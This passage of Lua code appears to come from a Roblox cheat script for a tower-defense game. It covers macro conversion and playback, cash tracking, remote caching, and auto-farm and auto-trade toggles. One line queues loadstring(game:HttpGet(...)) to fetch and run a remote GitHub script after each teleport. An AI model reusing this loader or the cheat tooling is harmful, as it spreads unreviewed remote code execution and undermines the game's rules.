                if #cframeArray >= 12 then
                    newStep.Args = {step.unit, cframeArray}
                    newStep.TowerName = step.unit
                    newStep.Cost = tonumber(step.money) or 0
                    table.insert(newData, newStep)
                else
                    warn("[Macro Converter] Invalid CFrame for SpawnUnit: " .. step.unit)
                end
                
            elseif step.type == "UpgradeUnit" then
                newStep.RemoteName = "Upgrade"
                newStep.ActionType = "Upgrade"
                newStep.Args = {}
                newStep.IsInvoke = true
                newStep.TowerName = step.unit
                newStep.Cost = tonumber(step.money) or 0
                
                local cframeArray = {}
                if step.cframe then
                    for num in string.gmatch(step.cframe, "[^,%s]+") do
                        local value = tonumber(num)
                        if value then
                            table.insert(cframeArray, value)
                        end
                    end
                end
                
                if #cframeArray >= 12 then
                    newStep.CFrame = cframeArray
                end
                
                table.insert(newData, newStep)
                
            elseif step.type == "SellUnit" then
                newStep.RemoteName = "Sell"
                newStep.ActionType = "Sell"
                newStep.Args = {}
                newStep.IsInvoke = true
                newStep.TowerName = step.unit
                newStep.Cost = 0
                
                local cframeArray = {}
                if step.cframe then
                    for num in string.gmatch(step.cframe, "[^,%s]+") do
                        local value = tonumber(num)
                        if value then
                            table.insert(cframeArray, value)
                        end
                    end
                end
                
                if #cframeArray >= 12 then
                    newStep.CFrame = cframeArray
                end
                
                table.insert(newData, newStep)
            else
                warn("[Macro Converter] Unknown step type: " .. tostring(step.type))
            end
        end
    end
    
    return newData
end

local function isOldMacroFormat(data)
    if type(data) ~= "table" then return false end
    
    if data.Data and data.Data.Map and data.Data.RecordMode then
        return true
    end
    
    for key, value in pairs(data) do
        if tonumber(key) and type(value) == "table" and value.type and value.money then
            return true
        end
    end
    
    return false
end

local function loadMacros()
    getgenv().Macros = {}
    if not isfolder(MACRO_FOLDER) then return end
    local files = listfiles(MACRO_FOLDER)
    if not files then return end
    local convertedCount = 0
    local loadedCount = 0
    
    for _, file in pairs(files) do
        if file:sub(-5) == ".json" then
            local fileName = file:match("([^/\\]+)%.json$")
            
            if fileName ~= "settings" and fileName ~= "playback_state" then
                local ok, data = pcall(function() 
                    return HttpService:JSONDecode(readfile(file)) 
                end)
                if ok and type(data) == "table" then
                    local isSettings = (data.playMacroEnabled ~= nil or data.selectedMacro ~= nil or data.macroMaps ~= nil)
                    if not isSettings then
                        if isOldMacroFormat(data) then
                            debugPrint("[Macro] Converting old format: " .. fileName)
                            local convertedData = convertOldMacroFormat(data)
                            if #convertedData > 0 then
                                getgenv().Macros[fileName] = convertedData
                                saveMacro(fileName, convertedData)
                                convertedCount = convertedCount + 1
                                loadedCount = loadedCount + 1
                                print("[Macro] ✅ Loaded (converted): " .. fileName .. " (" .. #convertedData .. " steps)")
                            else
                                warn("[Macro] ❌ Failed to convert: " .. fileName .. " (0 steps after conversion)")
                            end
                        else
                            if type(data) == "table" then
                                getgenv().Macros[fileName] = data
                                loadedCount = loadedCount + 1
                                if #data > 0 then
                                    print("[Macro] ✅ Loaded: " .. fileName .. " (" .. #data .. " steps)")
                                end
                            else
                                warn("[Macro] ❌ Skipped: " .. fileName .. " (invalid format)")
                            end
                        end
                    end
                else
                    warn("[Macro] ❌ Failed to decode: " .. fileName)
                end
            end
        end
    end
    
    
    if convertedCount > 0 then
        Window:Notify({
            Title = "Macro Converter",
            Description = "Converted " .. convertedCount .. " old format macro(s)",
            Lifetime = 5
        })
    end
end

local function loadMacro(macroName)
    if not macroName or macroName == "" then return nil end
    
    if getgenv().Macros and getgenv().Macros[macroName] then
        return getgenv().Macros[macroName]
    end
    
    local filePath = MACRO_FOLDER .. "/" .. macroName .. ".json"
    if isfile(filePath) then
        local ok, data = pcall(function()
            return HttpService:JSONDecode(readfile(filePath))
        end)
        if ok and type(data) == "table" then
            if isOldMacroFormat(data) then
                debugPrint("[Macro] Converting: " .. macroName)
                local convertedData = convertOldMacroFormat(data)
                
                if #convertedData > 0 then
                    getgenv().Macros[macroName] = convertedData
                    saveMacro(macroName, convertedData)
                    
                    Window:Notify({
                        Title = "Macro Converter",
                        Description = "Converted: " .. macroName .. " (" .. #convertedData .. " steps)",
                        Lifetime = 5
                    })
                    
                    return convertedData
                end
            end
            return data
        end
    end
    
    return nil
end

local function getMacroNames()
    local names = {}
    for name in pairs(getgenv().Macros) do 
        table.insert(names, name) 
    end
    table.sort(names)
    return names
end

local savedMacroSettings = loadMacroSettings()
getgenv().MacroMaps = savedMacroSettings.macroMaps or {}
getgenv().MacroStepDelay = savedMacroSettings.stepDelay or 0
getgenv().CurrentMacro = savedMacroSettings.selectedMacro

getgenv().MacroPlayEnabled = getgenv().Config.toggles.MacroPlayToggle or false

loadMacros()

getgenv().LoadMacroSettings = loadMacroSettings
getgenv().SaveMacroSettings = saveMacroSettings
getgenv().LoadMacros = loadMacros
getgenv().SaveMacro = saveMacro
getgenv().GetMacroNames = getMacroNames

getgenv().MacroStatusText = "Idle"
getgenv().MacroActionText = ""
getgenv().MacroUnitText = ""
getgenv().MacroWaitingText = ""
getgenv().MacroCurrentStep = 0
getgenv().MacroTotalSteps = 0
getgenv().MacroLastStatusUpdate = 0

local cachedLabels = {}
local lastStatusValues = {
    status = "",
    step = 0,
    action = "",
    unit = "",
    waiting = ""
}

getgenv().UpdateMacroStatus = function()
    local now = tick()
    if now - getgenv().MacroLastStatusUpdate < 0.1 then 
        return 
    end
    
    local currentStatus = getgenv().MacroStatusText or "Idle"
    local currentStep = getgenv().MacroCurrentStep or 0
    local currentAction = getgenv().MacroActionText or ""
    local currentUnit = getgenv().MacroUnitText or ""
    local currentWaiting = getgenv().MacroWaitingText or ""
    
    local shouldUpdate = false
    if currentStatus ~= lastStatusValues.status or
       currentStep ~= lastStatusValues.step or
       currentAction ~= lastStatusValues.action or
       currentUnit ~= lastStatusValues.unit or
       currentWaiting ~= lastStatusValues.waiting then
        shouldUpdate = true
        lastStatusValues.status = currentStatus
        lastStatusValues.step = currentStep
        lastStatusValues.action = currentAction
        lastStatusValues.unit = currentUnit
        lastStatusValues.waiting = currentWaiting
    end
    
    if not shouldUpdate then
        return
    end
    
    getgenv().MacroLastStatusUpdate = now
    
    pcall(function()
        if not cachedLabels.status then cachedLabels.status = getgenv().MacroStatusLabel end
        if not cachedLabels.step then cachedLabels.step = getgenv().MacroStepLabel end
        if not cachedLabels.action then cachedLabels.action = getgenv().MacroActionLabel end
        if not cachedLabels.unit then cachedLabels.unit = getgenv().MacroUnitLabel end
        if not cachedLabels.waiting then cachedLabels.waiting = getgenv().MacroWaitingLabel end
        
        if cachedLabels.status and cachedLabels.status.UpdateName then
            cachedLabels.status:UpdateName("Status: " .. currentStatus)
        end
        
        if cachedLabels.step and cachedLabels.step.UpdateName then
            cachedLabels.step:UpdateName("📝 Step: " .. currentStep .. "/" .. (getgenv().MacroTotalSteps or 0))
        end
        
        if cachedLabels.action and cachedLabels.action.UpdateName then
            cachedLabels.action:UpdateName("⚡ Action: " .. (currentAction ~= "" and currentAction or "None"))
        end
        
        if cachedLabels.unit and cachedLabels.unit.UpdateName then
            cachedLabels.unit:UpdateName("🗼 Unit: " .. (currentUnit ~= "" and currentUnit or "None"))
        end
        
        if cachedLabels.waiting and cachedLabels.waiting.UpdateName then
            cachedLabels.waiting:UpdateName("⏳ Waiting: " .. (currentWaiting ~= "" and currentWaiting or "None"))
        end
    end)
end


getgenv().MacroCurrentCash = 0
getgenv().MacroLastCash = 0
getgenv().MacroCashHistory = {}
local MAX_CASH_HISTORY = 5

local cashConnection
pcall(function()
    if LocalPlayer:FindFirstChild("Cash") then
        getgenv().MacroCurrentCash = LocalPlayer.Cash.Value
        cashConnection = ConnectionManager:trackGroup("MacroSystem",
            LocalPlayer.Cash:GetPropertyChangedSignal("Value"):Connect(function()
                getgenv().MacroCurrentCash = LocalPlayer.Cash.Value
            end),
            "Macro Cash Tracking"
        )
    end
end)

local cashTrackingActive = false
local cashTrackingConnection
local function trackCash()
    if cashTrackingActive then return end
    cashTrackingActive = true
    
    pcall(function()
        if LocalPlayer:FindFirstChild("Cash") then
            getgenv().MacroLastCash = LocalPlayer.Cash.Value
            
            cashTrackingConnection = ConnectionManager:trackGroup("MacroSystem",
                LocalPlayer.Cash:GetPropertyChangedSignal("Value"):Connect(function()
                    local currentCash = tonumber(LocalPlayer.Cash.Value) or 0
                    local lastCash = tonumber(getgenv().MacroLastCash) or 0
                    
                    if lastCash > 0 and currentCash < lastCash then
                        local decrease = lastCash - currentCash
                        
                        if not getgenv().MacroCashHistory or type(getgenv().MacroCashHistory) ~= "table" then
                            getgenv().MacroCashHistory = {}
                        end
                        
                        table.insert(getgenv().MacroCashHistory, 1, {
                            time = tick(),
                            decrease = decrease,
                            before = lastCash,
                            after = currentCash
                        })
                        
                        if #getgenv().MacroCashHistory > MAX_CASH_HISTORY then
                            table.remove(getgenv().MacroCashHistory)
                        end
                    end
                    
                    getgenv().MacroLastCash = currentCash
                end),
                "Macro Cash History Tracking"
            )
        end
    end)
end

getgenv().GetRecentCashDecrease = function(withinSeconds)
    withinSeconds = withinSeconds or 1
    local now = tick()
    for _, entry in ipairs(getgenv().MacroCashHistory) do
        if (now - entry.time) <= withinSeconds then
            return entry.decrease
        end
    end
    return 0
end

trackCash()


local function isKilled()
    return getgenv().MacroSystemKillSwitch == true
end

getgenv().IsKilled = isKilled

getgenv().MacroTowerInfoCache = {}
getgenv().MacroRemoteCache = {}

local RSCache = {
    Remotes = nil,
    Modules = nil,
    lastRefresh = 0,
    refreshInterval = 30
}

local function getRSRemotes()
    if not RSCache.Remotes or (tick() - RSCache.lastRefresh) > RSCache.refreshInterval then
        RSCache.Remotes = RS:FindFirstChild("Remotes")
        RSCache.lastRefresh = tick()
    end
    return RSCache.Remotes
end

local function getRSModules()
    if not RSCache.Modules or (tick() - RSCache.lastRefresh) > RSCache.refreshInterval then
        RSCache.Modules = RS:FindFirstChild("Modules")
        RSCache.lastRefresh = tick()
    end
    return RSCache.Modules
end

getgenv().GetRSRemotes = getRSRemotes
getgenv().GetRSModules = getRSModules

local function cacheTowerInfo()
    if next(getgenv().MacroTowerInfoCache) then return end
    
    pcall(function()
        local modules = getRSModules()
        if not modules then return end
        local towerInfoPath = modules:FindFirstChild("TowerInfo")
        if not towerInfoPath then return end
        for _, mod in pairs(towerInfoPath:GetChildren()) do
            if mod:IsA("ModuleScript") then
                local ok, data = pcall(function() 
                    return require(mod) 
                end)
                if ok then 
                    getgenv().MacroTowerInfoCache[mod.Name] = data 
                end
            end
        end
    end)
end


local ClientDataCache = {
    module = nil,
    lastUpdate = 0,
    cacheTimeout = 5
}

local function getClientData()
    local currentTime = tick()
    
    if ClientDataCache.module and (currentTime - ClientDataCache.lastUpdate) < ClientDataCache.cacheTimeout then
        return ClientDataCache.module
    end
    
    local ok, data = pcall(function()
        local modules = getRSModules()
        if not modules then return nil end
        local modulePath = modules:FindFirstChild("ClientData")
        if modulePath and modulePath:IsA("ModuleScript") then
            return require(modulePath)
        end
        return nil
    end)
    
    if ok and data then
        ClientDataCache.module = data
        ClientDataCache.lastUpdate = currentTime
        return data
    end
    
    return ClientDataCache.module
end

getgenv().GetUnitEnchantDiscountSafe = function(unitName)
    local startTime = tick()
    local maxExecutionTime = 0.1
    
    local success, result = pcall(function()
        if (tick() - startTime) > maxExecutionTime then
            return 1.0, false, nil
        end
        
        local clientData = getClientData()
        
        if not clientData then
            return 1.0, false, nil
        end
        
        if not clientData.Slots or not clientData.UnitData then
            return 1.0, false, nil
        end
        
        for slotName, slotData in pairs(clientData.Slots) do
            if (tick() - startTime) > maxExecutionTime then
                return 1.0, false, nil
            end
            
            if slotData and slotData.Value == unitName and slotData.UnitID then
                local unitData = clientData.UnitData[slotData.UnitID]
                if unitData and unitData.Enchant then
                    local enchant = unitData.Enchant
                    if enchant == "Midas" or enchant == "Efficiency" then
                        getgenv()._DiagnosticsLogger_logDiscountCalculation(unitName, 0.8, enchant, true)
                        return 0.8, true, enchant
                    end
                end
                break
            end
        end
        
        getgenv()._DiagnosticsLogger_logDiscountCalculation(unitName, 1.0, nil, true)
        return 1.0, true, nil
    end)
    
    if not success then
        getgenv()._DiagnosticsLogger_logDiscountError(unitName, tostring(result))
        return 1.0, false
    end
    
    return result
end

local function getUnitEnchantDiscount(unitName)
    local multiplier, success = getgenv().GetUnitEnchantDiscountSafe(unitName)
    return multiplier
end

getgenv().CrashMonitor = getgenv().CrashMonitor or {
    isMonitoring = false,
    monitoringTask = nil,
    startTime = 0,
    memoryHistory = {},
    connectionHistory = {},
    checkInterval = 30,
    memoryThreshold = 100,
    maxHistorySize = 20
}

getgenv()._CrashMonitor_startMonitoring = function()
    local monitor = getgenv().CrashMonitor
    
    if monitor.isMonitoring then
        return
    end
    
    monitor.isMonitoring = true
    monitor.startTime = tick()
    
    if monitor.monitoringTask then
        pcall(function()
            task.cancel(monitor.monitoringTask)
        end)
    end
    
    monitor.monitoringTask = task.spawn(function()
        while monitor.isMonitoring do
            task.wait(monitor.checkInterval)
            
            pcall(function()
                local currentMemory = collectgarbage("count") / 1024
                local currentTime = tick()
                
                local connectionCount = 0
                pcall(function()
                    if getgenv()._GlobalConnections then
                        connectionCount = #getgenv()._GlobalConnections
                    end
                end)
                
                local memoryEntry = {
                    time = currentTime,
                    memory = currentMemory,
                    connections = connectionCount
                }
                
                table.insert(monitor.memoryHistory, memoryEntry)
                
                if #monitor.memoryHistory > monitor.maxHistorySize then
                    table.remove(monitor.memoryHistory, 1)
                end
                
                if #monitor.memoryHistory >= 2 then
                    local oldestEntry = monitor.memoryHistory[1]
                    local timeDiff = currentTime - oldestEntry.time
                    local memoryGrowth = currentMemory - oldestEntry.memory
                    
                    if timeDiff >= 60 and memoryGrowth > monitor.memoryThreshold then
                        warn(string.format("[CrashMonitor] Excessive memory growth detected: %.2f MB in %.1fs", 
                            memoryGrowth, timeDiff))
                        
                        getgenv()._DiagnosticsLogger_logCrashWarning("excessive_memory_growth", {
                            memoryGrowth = memoryGrowth,
                            timeDiff = timeDiff,
                            currentMemory = currentMemory,
                            connections = connectionCount
                        })
                        
                        if getgenv().DebugMode then
                            debugPrint(string.format("[CrashMonitor] Current: %.2f MB | Connections: %d", 
                                currentMemory, connectionCount))
                        end
                        
                        getgenv()._CrashMonitor_performCleanup()
                    end
                end
                
                if getgenv().DebugMode then
                    debugPrint(string.format("[CrashMonitor] Memory: %.2f MB | Connections: %d", 
                        currentMemory, connectionCount))
                end
            end)
        end
    end)
end

getgenv()._CrashMonitor_stopMonitoring = function()
    local monitor = getgenv().CrashMonitor
    
    if not monitor.isMonitoring then
        return
    end
    
    monitor.isMonitoring = false
    
    if monitor.monitoringTask then
        pcall(function()
            task.cancel(monitor.monitoringTask)
        end)
        monitor.monitoringTask = nil
    end
end

getgenv()._CrashMonitor_performCleanup = function()
    pcall(function()
        if ConnectionManager then
            ConnectionManager:cleanup()
        end
    end)
    
    pcall(function()
        if MemoryManager then
            MemoryManager:cleanup()
        end
    end)
    
    pcall(function()
        collectgarbage("collect")
    end)
    
    if getgenv().DebugMode then
        local newMemory = collectgarbage("count") / 1024
        debugPrint(string.format("[CrashMonitor] Cleanup complete. Memory: %.2f MB", newMemory))
    end
end

getgenv()._CrashMonitor_getStats = function()
    local monitor = getgenv().CrashMonitor
    
    local currentMemory = collectgarbage("count") / 1024
    local connectionCount = 0
    
    pcall(function()
        if getgenv()._GlobalConnections then
            connectionCount = #getgenv()._GlobalConnections
        end
    end)
    
    return {
        isMonitoring = monitor.isMonitoring,
        uptime = monitor.startTime > 0 and (tick() - monitor.startTime) or 0,
        currentMemory = currentMemory,
        connectionCount = connectionCount,
        historySize = #monitor.memoryHistory,
        checkInterval = monitor.checkInterval
    }
end

local function getEZATowerName(baseTowerName)
    local clientData = getClientData()
    if not clientData or not clientData.Slots then return baseTowerName end
    
    for slotName, slotData in pairs(clientData.Slots) do
        if slotData and slotData.Value == baseTowerName and slotData.UnitID then
            if clientData.UnitData and clientData.UnitData[slotData.UnitID] then
                if clientData.UnitData[slotData.UnitID].EZA == true then
                    return baseTowerName .. "EZA"
                end
            elseif clientData[slotData.UnitID] then
                if clientData[slotData.UnitID].EZA == true then
                    return baseTowerName .. "EZA"
                end
            end
        end
    end
    
    return baseTowerName
end

getgenv().GetPlaceCost = function(towerName)
    if not getgenv().MacroTowerInfoCache then
        return 0
    end
    
    local towerNameToCheck = getEZATowerName(towerName)
    
    if not getgenv().MacroTowerInfoCache[towerNameToCheck] then 
        return 0 
    end
    
    if getgenv().MacroTowerInfoCache[towerNameToCheck][0] then
        return getgenv().MacroTowerInfoCache[towerNameToCheck][0].Cost or 0
    end
    
    return 0
end

getgenv().GetUpgradeCost = function(towerName, currentLevel)
    if not getgenv().MacroTowerInfoCache then
        return 0
    end
    
    local towerNameToCheck = getEZATowerName(towerName)
    
    if not getgenv().MacroTowerInfoCache[towerNameToCheck] then 
        return 0 
    end
    
    local nextLevel = (currentLevel or 0) + 1
    if getgenv().MacroTowerInfoCache[towerNameToCheck][nextLevel] then
        return getgenv().MacroTowerInfoCache[towerNameToCheck][nextLevel].Cost or 0
    end
    
    return 0
end

local function getTowerInfo(unitName)
    local ok, data = pcall(function()
        local modules = RS:FindFirstChild("Modules")
        if not modules then return nil end
        local towerInfoPath = modules:FindFirstChild("TowerInfo")
        if not towerInfoPath then return nil end
        local towerModule = towerInfoPath:FindFirstChild(unitName)
        if towerModule and towerModule:IsA("ModuleScript") then
            return require(towerModule)
        end
        return nil
    end)
    return ok and data or nil
end

local function getAllAbilities(unitName)
    if not unitName or unitName == "" then return {} end
    local towerInfo = getTowerInfo(unitName)
    if not towerInfo then return {} end
    local abilities = {}
    local seenAbilities = {}
    
    for level = 0, 50 do
        if towerInfo[level] then
            if towerInfo[level].Ability then
                local a = towerInfo[level].Ability
                local nm = a.Name
                
                if not seenAbilities[nm] then
                    seenAbilities[nm] = true
                    
                    local hasRealAttribute = false
                    if a.AttributeRequired and type(a.AttributeRequired) == "table" then
                        if a.AttributeRequired.Name ~= "JUST_TO_DISPLAY_IN_LOBBY" then
                            hasRealAttribute = true
                        end
                    elseif a.AttributeRequired and type(a.AttributeRequired) ~= "table" then
                        hasRealAttribute = true
                    end
                    abilities[nm] = {
                        name = nm,
                        cooldown = a.Cd,
                        requiredLevel = level,
                        isGlobal = a.IsCdGlobal or false,
                        isAttribute = hasRealAttribute
                    }
                end
            end
            
            if towerInfo[level].Abilities then
                for idx, a in pairs(towerInfo[level].Abilities) do
                    local nm = a.Name
                    
                    if not seenAbilities[nm] then
                        seenAbilities[nm] = true
                        
                        local hasRealAttribute = false
                        if a.AttributeRequired and type(a.AttributeRequired) == "table" then
                            if a.AttributeRequired.Name ~= "JUST_TO_DISPLAY_IN_LOBBY" then
                                hasRealAttribute = true
                            end
                        elseif a.AttributeRequired and type(a.AttributeRequired) ~= "table" then
                            hasRealAttribute = true
                        end
                        abilities[nm] = {
                            name = nm,
                            cooldown = a.Cd,
                            requiredLevel = level,
                            isGlobal = a.IsCdGlobal or false,
                            isAttribute = hasRealAttribute
                        }
                    end
                end
            end
        end
    end
    
    return abilities
end

getgenv().AutoAbilitiesEnabled = getgenv().Config.toggles.AutoAbilityToggle or false
getgenv().UnitAbilities = getgenv().UnitAbilities or {}
getgenv().EZAUnitMapping = getgenv().EZAUnitMapping or {}

getgenv().AutoReadyEnabled = getgenv().Config.toggles.AutoReady or false
getgenv().AutoNextEnabled = getgenv().Config.toggles.AutoNext or false
getgenv().AutoLeaveEnabled = getgenv().Config.toggles.AutoLeave or false
getgenv().AutoEnchantEnabled = false
getgenv().AutoEnchantUnit = getgenv().Config.inputs.AutoEnchantUnit or ""
getgenv().AutoEnchantMaterial = getgenv().Config.inputs.AutoEnchantMaterial or "Pearl"
getgenv().AutoEnchantDesiredEnchants = getgenv().Config.inputs.AutoEnchantDesiredEnchants or {}
getgenv().AutoFastRetryEnabled = getgenv().Config.toggles.AutoRetry or false
getgenv().AutoSmartEnabled = getgenv().Config.toggles.AutoSmart or false

getgenv().AutoEventEnabled = getgenv().Config.toggles.AutoEventToggle or false
getgenv().BingoEnabled = getgenv().Config.toggles.BingoToggle or false
getgenv().CapsuleEnabled = getgenv().Config.toggles.CapsuleToggle or false
getgenv().TwoXTrackerEnabled = getgenv().Config.toggles.TwoXTrackerToggle or false
getgenv().TwoXResetWave = tonumber(getgenv().Config.inputs.TwoXResetWave) or 30
getgenv().AutoBuyCapsuleEnabled = getgenv().Config.toggles.AutoBuyCapsuleToggle or false

getgenv().AutoEvent2Enabled = getgenv().Config.toggles.AutoEvent2Toggle or false
getgenv().AutoCandyEnabled = getgenv().Config.toggles.AutoCandyToggle or false
getgenv().Capsule2Enabled = getgenv().Config.toggles.Capsule2Toggle or false
getgenv().AutoBuyCapsule2Enabled = getgenv().Config.toggles.AutoBuyCapsule2Toggle or false

getgenv().AutoFuseRainbowCandyEnabled = getgenv().Config.toggles.AutoFuseRainbowCandyToggle or false
getgenv().AutoFuseCandyBagEnabled = getgenv().Config.toggles.AutoFuseCandyBagToggle or false
getgenv().AutoFuseBigCandyBagEnabled = getgenv().Config.toggles.AutoFuseBigCandyBagToggle or false
getgenv().AutoOpenCandyBagEnabled = getgenv().Config.toggles.AutoOpenCandyBagToggle or false
getgenv().AutoOpenBigCandyBagEnabled = getgenv().Config.toggles.AutoOpenBigCandyBagToggle or false

getgenv().AutoTradePlayerEnabled = false
getgenv().AutoTradeTargetPlayer = getgenv().Config.dropdowns.AutoTradeTargetPlayer or nil
getgenv().AutoAcceptTradeEnabled = getgenv().Config.toggles.AutoAcceptTradeToggle or false
getgenv().AutoAcceptTradeFromPlayers = getgenv().Config.dropdowns.AutoAcceptTradeFromPlayers or {}
getgenv().AutoReadyTradeEnabled = getgenv().Config.toggles.AutoReadyTradeToggle or false
getgenv().AutoTradeItems = getgenv().Config.dropdowns.AutoTradeItems or {}

getgenv().RemoveEnemiesEnabled = getgenv().Config.toggles.RemoveEnemiesToggle or false
getgenv().AntiAFKEnabled = getgenv().Config.toggles.AntiAFKToggle or false
getgenv().BlackScreenEnabled = getgenv().Config.toggles.BlackScreenToggle or false
getgenv().FPSBoostEnabled = getgenv().Config.toggles.FPSBoostToggle or false

getgenv().BossRushEnabled = getgenv().Config.toggles.BossRushToggle or false

getgenv().SeamlessFixEnabled = getgenv().Config.toggles.SeamlessFixToggle or false
getgenv().SeamlessRounds = tonumber(getgenv().Config.inputs.SeamlessRounds) or 4
getgenv().AutoExecuteTeleportEnabled = getgenv().Config.toggles.AutoExecuteTeleport or false
getgenv().AutoExecuteEnabled = getgenv().Config.toggles.AutoExecuteToggle or false

local queueteleport = queue_on_teleport or queueonteleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport) or (Xeno and Xeno.queue_on_teleport)

if queueteleport then
    local scriptToQueue = 'repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer; task.wait(2); loadstring(game:HttpGet("https://raw.githubusercontent.com/Byorl/ALS-Scripts/refs/heads/main/ALS%20Halloween%20UI.lua"))()'
    
    LocalPlayer.OnTeleport:Connect(function(State)
        if getgenv().AutoExecuteEnabled then
            pcall(function()
                queueteleport(scriptToQueue)
                print("[ALS] ✅ Auto Execute queued via OnTeleport")
            end)
        end
    end)
    
    task.spawn(function()
        while true do
            task.wait(5)
            if getgenv().AutoExecuteEnabled then
                pcall(function()
                    queueteleport(scriptToQueue)
                end)
            end
        end
    end)
    
    if getgenv().AutoExecuteEnabled then
        print("[ALS] ✅ Auto Execute active (will re-queue every 5s)")
    end
else
    if getgenv().AutoExecuteEnabled then
        warn("[ALS] ⚠️ Auto Execute enabled but queue_on_teleport not supported by your executor")
    end
end

if getgenv().SeamlessFixEnabled then
    task.spawn(function()
        task.wait(2)
        task.spawn(function()
            pcall(function()
                local remotes = RS:FindFirstChild("Remotes")
                local setSettings = remotes and remotes:FindFirstChild("SetSettings")
                if setSettings then 
                    setSettings:InvokeServer("SeamlessRetry")
                end
            end)
        end)
    end)
end

getgenv().WebhookEnabled = getgenv().Config.toggles.WebhookToggle or false
getgenv().WebhookProcessing = false
getgenv().WebhookIncludePlayerCount = getgenv().Config.toggles.WebhookIncludePlayerCount or false
getgenv().WebhookIncludePlayerNames = getgenv().Config.toggles.WebhookIncludePlayerNames or false

getgenv().GetClientData = getClientData
getgenv().GetTowerInfo = getTowerInfo
getgenv().GetAllAbilities = getAllAbilities

local function cacheRemotes()
    if next(getgenv().MacroRemoteCache) then return true end
    
    pcall(function()
        for _, v in pairs(RS:GetDescendants()) do
            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                getgenv().MacroRemoteCache[v.Name:lower()] = v
            end
        end
    end)
    
    local count = 0
    for _ in pairs(getgenv().MacroRemoteCache) do 
        count = count + 1 
    end
    
    return count > 0
end

local function ensureCachesReady()
    cacheTowerInfo()
    
    local attempts = 0
    while not cacheRemotes() and attempts < 10 do
        task.wait(0.5)
        attempts = attempts + 1
    end
    
    if attempts >= 10 then
        warn("[Macro] Warning: Remote cache may be incomplete")
    end
end

getgenv().CacheTowerInfo = cacheTowerInfo
getgenv().CacheRemotes = cacheRemotes
getgenv().EnsureCachesReady = ensureCachesReady

getgenv().AbilityRecordingEnabled = true

getgenv()._cacheAbilityRemotes = function()
    local success, err = pcall(function()
        local remotes = RS:WaitForChild("Remotes", 10)
        if not remotes then
            warn("[Macro] Error: ReplicatedStorage.Remotes not found - ability recording disabled")
            getgenv().AbilityRecordingEnabled = false
            return
        end
        
        local abilityRemote = remotes:WaitForChild("Ability", 5)
        if abilityRemote and abilityRemote:IsA("RemoteFunction") then
            getgenv().MacroRemoteCache["ability"] = abilityRemote
            debugPrint("[Macro] Ability remote cached successfully")
        end
        
        local abilitySelectionRemote = remotes:WaitForChild("AbilitySelection", 5)
        if abilitySelectionRemote and abilitySelectionRemote:IsA("RemoteEvent") then
            getgenv().MacroRemoteCache["abilityselection"] = abilitySelectionRemote
            debugPrint("[Macro] AbilitySelection remote cached successfully")
        end
    end)
    
    if not success then
        warn("[Macro] Error caching ability remotes: " .. tostring(err))
        getgenv().AbilityRecordingEnabled = false
    end
end

task.spawn(function()
    task.wait(3)
    ensureCachesReady()
    getgenv()._cacheAbilityRemotes()
end)


getgenv().GameState = getgenv().GameState or {
    gameEnded = false,
    gameStarted = false,
    wave = 0,
    elapsedTime = 0,
    timeScale = 1,
    isNewRound = false,
    isInGame = false,
    roundJustEnded = false,
    roundJustStarted = false,
    _prevGameEnded = false,
    _prevGameStarted = false,
    _prevWave = 0,
    roundStartTime = 0,
    lastUpdate = 0,
    towerCount = 0,
    lastTowerCount = 0
}

local function updateGameState()
    local state = getgenv().GameState
    local now = tick()
    state.lastUpdate = now
    
    local success = pcall(function()
        local gameEndedValue = RS:FindFirstChild("GameEnded")
        if gameEndedValue and gameEndedValue.Value ~= nil then
            state.gameEnded = gameEndedValue.Value
        end
        
        local gameStartedValue = RS:FindFirstChild("GameStarted")
        if gameStartedValue and gameStartedValue.Value ~= nil then
            state.gameStarted = gameStartedValue.Value
        end
        
        local waveValue = RS:FindFirstChild("Wave")
        if waveValue and waveValue.Value ~= nil then
            state.wave = waveValue.Value
        end
        
        local elapsedValue = RS:FindFirstChild("ElapsedTime")
        if elapsedValue and elapsedValue.Value ~= nil then
            state.elapsedTime = elapsedValue.Value
        end
        
        local timeScaleValue = RS:FindFirstChild("TimeScale")
        if timeScaleValue and timeScaleValue.Value ~= nil then
            state.timeScale = timeScaleValue.Value
        end
    end)
    
    if not success then return end
    
    state.roundJustEnded = state.gameEnded and not state._prevGameEnded
    state.roundJustStarted = state.gameStarted and not state._prevGameStarted
    
    if state.wave == 1 and state._prevWave ~= 1 and state.gameStarted and not state.gameEnded then
        state.isNewRound = true
        state.roundStartTime = now
        if getgenv().DebugMode then
            print("[GameState] New round detected - Wave 1, GameStarted=true, GameEnded=false")
        end
    else
        state.isNewRound = false
    end
    
    state.isInGame = state.gameStarted and not state.gameEnded
    
    local towerCount = 0
    pcall(function()
        if workspace:FindFirstChild("Towers") then
            for _, tower in pairs(workspace.Towers:GetChildren()) do
                local owner = tower:FindFirstChild("Owner")
                if owner and owner.Value == LocalPlayer then
                    towerCount = towerCount + 1
                end
            end
        end
    end)
    state.lastTowerCount = state.towerCount
    state.towerCount = towerCount
    
    if state.roundJustEnded then
        if getgenv().DebugMode then
            print("[GameState] Round ended - GameEnded=true")
        end
        
        getgenv().BulmaWishUsedThisRound = false
        getgenv().WukongTrackedClones = {}
        getgenv()._WukongLastSynthesisTime = 0
        getgenv().SkeletonKnightLastUse = 0
        getgenv().AlucardHypnosisLastUse = 0
        getgenv().SmartCardPicked = {}
        getgenv().SmartCardLastPromptId = nil
        getgenv().SlowerCardPicked = {}
        getgenv().SlowerCardLastPromptId = nil
        getgenv().OneEyeDevilCurrentIndex = 0
        
        pcall(function()
            if MemoryManager then
                MemoryManager:cleanup()
            end
        end)
        
        if getgenv()._EtoEvoAbilityUsed then
            getgenv()._EtoEvoAbilityUsed = {}
        end
        
        if getgenv().FinalExpChestRewards then
            getgenv().FinalExpChestRewards = nil
        end
        
        pcall(function()
            for i = 1, 3 do
                safeGarbageCollect()
                task.wait(0.1)
            end
        end)
    end
    
    state._prevGameEnded = state.gameEnded
    state._prevGameStarted = state.gameStarted
    state._prevWave = state.wave
end

getgenv().MacroGameState = {
    currentWave = 0,
    isInGame = false,
    hasStartButton = false,
    hasEndGameUI = false,
    gameEnded = false,
    lastWaveChange = 0,
    matchStartTime = 0,
    lastGameEndedState = false,
    lastEndGameUIState = false,
    seamlessTransition = false,
    towerCount = 0,
    lastTowerCount = 0
}

local function syncLegacyState()
    local state = getgenv().GameState
    local legacy = getgenv().MacroGameState
    
    legacy.currentWave = state.wave
    legacy.isInGame = state.isInGame
    legacy.gameEnded = state.gameEnded
